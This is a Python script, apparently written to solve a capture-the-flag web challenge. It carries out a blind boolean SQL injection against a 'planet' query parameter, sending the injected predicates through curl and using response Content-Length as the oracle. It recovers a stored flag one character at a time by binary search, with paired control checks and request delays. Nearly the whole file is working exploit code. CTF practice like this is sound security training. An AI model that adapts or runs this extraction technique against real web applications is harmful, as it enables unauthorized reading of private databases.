#!/usr/bin/env python3
"""Sequential, paired-control blind extraction of the authorized challenge flag."""
import json
import re
import subprocess
import string
import time
from pathlib import Path

BASE = "https://planetary.web.2026.sunshinectf.games/probe"
PREFIX = "ZZZNOTAPLANETR1P2"
DELAY = 1.2
VALUE = "(SELECT v FROM zleak LIMIT 1)"
LOG = Path(__file__).with_name("flag_oracle.jsonl")
RESULT = Path(__file__).with_name("recovered_flag.json")
ALLOWED_BODY = set(string.ascii_lowercase + string.digits + "_-")


def ask(predicate):
    planet = f"{PREFIX}' OR ({predicate})-- -"
    cp = subprocess.run(
        ["curl", "-sS", "-I", "--max-time", "15", "--get", "--data-urlencode",
         f"planet={planet}", BASE],
        check=True, capture_output=True, text=True,
    )
    status = re.search(r"^HTTP/\S+\s+(\d+)", cp.stdout, re.MULTILINE)
    length = re.search(r"^content-length:\s*(\d+)", cp.stdout, re.IGNORECASE | re.MULTILINE)
    if not status or int(status.group(1)) != 200 or not length:
        raise RuntimeError(f"unexpected HEAD response: {cp.stdout!r}; {cp.stderr!r}")
    n = int(length.group(1))
    if n not in (5622, 5604):
        raise RuntimeError(f"unexpected Content-Length: {n}")
    yes = n == 5622
    with LOG.open("a") as f:
        f.write(json.dumps({"predicate": predicate, "content_length": n,
                            "signal": "carrier" if yes else "null"}) + "\n")
    time.sleep(DELAY)
    return yes


def paired(label, predicate, opposite):
    a, b = ask(predicate), ask(opposite)
    if a == b:
        raise RuntimeError(f"{label}: paired control did not flip; stop extraction")
    print(json.dumps({"paired_control": label,
                      "predicate_signal": "carrier" if a else "null",
                      "opposite_signal": "carrier" if b else "null"}), flush=True)
    return a


def ascii_expression(pos):
    return f"ASCII(SUBSTRING({VALUE},{pos},1))"


def extract_char(pos, initial_range=None):
    cp = ascii_expression(pos)
    if initial_range is None:
        low, high = 32, 126
    else:
        low, high = initial_range
    while low < high:
        mid = (low + high) // 2
        if ask(f"{cp} > {mid}"):
            low = mid + 1
        else:
            high = mid
    char = chr(low)
    if char not in ALLOWED_BODY:
        raise RuntimeError(
            f"position {pos} decoded to implausible flag-body character {char!r} (ASCII {low}); stop"
        )
    print(json.dumps({"position": pos, "ascii": low, "character": char}), flush=True)
    return char


def main():
    if not paired("known-prefix", f"SUBSTRING({VALUE},1,4) = 'sun{{'",
                  f"SUBSTRING({VALUE},1,4) <> 'sun{{'"):
        raise RuntimeError("stored value does not start with sun{")

    if not paired("closing-brace", f"SUBSTRING({VALUE},19,1) = '}'",
                  f"SUBSTRING({VALUE},19,1) <> '}'"):
        raise RuntimeError("stored value does not end with }")

    cp = ascii_expression(5)
    if not paired("flag-character-printable",
                  f"{cp} BETWEEN 32 AND 126",
                  f"NOT ({cp} BETWEEN 32 AND 126)"):
        raise RuntimeError("first unknown flag character is outside printable ASCII")
    high = paired("flag-character-threshold",
                  f"{cp} > 79", f"{cp} <= 79")
    first_range = (80, 126) if high else (32, 79)

    body_chars = [extract_char(5, first_range)]
    for pos in range(6, 19):
        body_chars.append(extract_char(pos))
    body = "".join(body_chars)
    flag = f"sun{{{body}}}"

    if not paired("whole-value-equality",
                  f"{VALUE} = '{flag}'",
                  f"{VALUE} <> '{flag}'"):
        raise RuntimeError("reconstructed value failed whole-value equality check")

    out = {"flag": flag, "source": VALUE, "total_length": 19,
           "body_length": len(body), "oracle_requests": sum(1 for _ in LOG.open())}
    RESULT.write_text(json.dumps(out, indent=2) + "\n")
    print(json.dumps(out), flush=True)


if __name__ == "__main__":
    main()
